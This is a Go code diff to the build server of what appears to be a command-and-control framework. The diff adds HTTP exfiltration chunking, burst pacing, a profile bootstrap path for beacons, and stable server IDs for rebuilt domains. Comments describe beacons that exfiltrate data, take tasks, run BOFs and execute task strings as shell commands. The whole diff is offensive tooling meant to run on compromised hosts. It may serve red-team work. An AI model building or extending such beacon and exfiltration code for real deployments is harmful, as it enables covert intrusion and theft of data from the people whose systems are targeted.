@@ -95,6 +95,9 @@ type HTTPListenerSpec struct {
 	Auth           map[string]interface{} `json:"auth,omitempty"`
 	TimeoutSecs    int                    `json:"timeout_secs,omitempty"`
 	MaxBodyBytes   int64                  `json:"max_body_bytes,omitempty"`
+	// BootstrapPath is where this listener hands out profiles to beacons
+	// (default /_p). Set from the profile document's uris.bootstrap.
+	BootstrapPath string `json:"bootstrap_path,omitempty"`
 }
 
 type PhaseConfigRequest struct {
@@ -138,6 +141,14 @@ type ClientBuildRequest struct {
 	HTTPListeners             []HTTPListenerSpec `json:"http_listeners,omitempty"`
 	HTTPFallbackAfterFailures int                `json:"http_fallback_after_failures,omitempty"`
 	HTTPRetryBackoffSecs      int                `json:"http_retry_backoff_secs,omitempty"`
+
+	// HTTP result chunking. MaxPayload is the raw byte budget for one DATA chunk
+	// on an HTTP beacon; MaxBodyBytes clamps it to what the listener accepts.
+	// Both default to 0, which keeps the DNS-derived sizing.
+	HTTPMaxPayload     int `json:"http_max_payload,omitempty"`
+	HTTPMaxBodyBytes   int `json:"http_max_body_bytes,omitempty"`
+	HTTPChunksPerBurst int `json:"http_chunks_per_burst,omitempty"`
+	HTTPBurstPauseMs   int `json:"http_burst_pause_ms,omitempty"`
 
 	// Per-phase malleable configuration
 	RegistrationPhase *PhaseConfigRequest     `json:"registration_phase,omitempty"`
@@ -257,7 +268,14 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 	apiKey := hex.EncodeToString(apiKeyBytes)
 
 	// NOTE: Don't register in DB until build succeeds - see below
+	// Rebuilding an existing domain must keep its server ID: the ID is a primary key
+	// referenced by beacon contacts, tasks and exfil sessions, and SQLite refuses to
+	// rewrite it (FOREIGN KEY constraint failed). Reusing it also keeps the built
+	// binary consistent with the record it will register against.
 	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())
+	if existingID, ok := api.db.ServerIDForDomain(req.Domain); ok {
+		serverID = existingID
+	}
 
 	// Get master server URL from config
 	// If BindAddr is 0.0.0.0, we need the actual hostname/IP
@@ -389,6 +407,23 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	if req.ExfilChunksPerBurst < 1 {
 		req.ExfilChunksPerBurst = 1
 	}
+
+	// HTTP result chunking defaults to what the listener will actually accept.
+	// Without this an HTTP build inherits the DNS label budget and sends 80 bytes
+	// per request despite a 1 MiB body allowance. An explicit request wins, and
+	// MaxBodyBytes still clamps it at the client.
+	if normalizeTransportMode(req.Transport) != "dns" {
+		if req.HTTPMaxBodyBytes == 0 && len(req.HTTPListeners) > 0 {
+			req.HTTPMaxBodyBytes = int(req.HTTPListeners[0].MaxBodyBytes)
+		}
+		if req.HTTPMaxPayload == 0 && req.HTTPMaxBodyBytes > 0 {
+			payload := req.HTTPMaxBodyBytes*5/8 - 128 // envelope: ids, indexes, separators
+			if payload < 1024 {
+				payload = 1024
+			}
+			req.HTTPMaxPayload = payload
+		}
+	}
 	if req.MaxSubdomainLength < 0 {
 		req.MaxSubdomainLength = 0
 	}
@@ -509,6 +544,16 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP := resolvePhaseConfigReq(req.DataExfilPhase, encrypted)
 
 	buildConfigMap := map[string]interface{}{
+		// Transport and the listener names a beacon was built for. The beacon
+		// dashboard reads them to decide whether a BOF can run and which HTTP
+		// listeners are already applied.
+		"transport":           normalizeTransportMode(req.Transport),
+		"http_listener_names": httpListenerNames(req.HTTPListeners),
+		// Capability flag: a beacon built before this could only take a transport
+		// update as a full payload. Sending it a short http_profile: task makes it
+		// execute the task string as a shell command, so the control plane has to
+		// know which form a given build understands.
+		"http_bootstrap":         true,
 		"sleep_min":              req.SleepMin,
 		"sleep_max":              req.SleepMax,
 		"exfil_jitter_min_ms":    req.ExfilJitterMinMs,
@@ -1134,6 +1179,12 @@ var embeddedConfig = Config{
 	BeaconName:           %q,
 	BuildID:              %q,
 	StagedRegistration:   %t,
+	HTTPExfil: HTTPExfilConfig{
+		MaxPayload:     %d,
+		MaxBodyBytes:   %d,
+		ChunksPerBurst: %d,
+		BurstPauseMs:   %d,
+	},
 	Registration: PhaseConfig{
 		QueryType:     %q,
 		Encrypted:     %t,
@@ -1188,6 +1239,7 @@ func getConfig() Config {
 		req.SleepMin, req.SleepMax, req.ExfilJitterMinMs, req.ExfilJitterMaxMs,
 		req.ExfilChunksPerBurst, req.ExfilBurstPauseMs, req.MaxSubdomainLength,
 		req.PayloadFormat, req.BeaconName, buildID, req.StagedRegistration,
+		req.HTTPMaxPayload, req.HTTPMaxBodyBytes, req.HTTPChunksPerBurst, req.HTTPBurstPauseMs,
 		regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP,
 		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP,
 		pollTaskIP, txtFollowUp,
